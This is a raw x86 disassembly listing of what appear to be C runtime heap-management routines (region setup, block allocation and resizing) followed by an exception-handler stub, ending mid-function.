  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
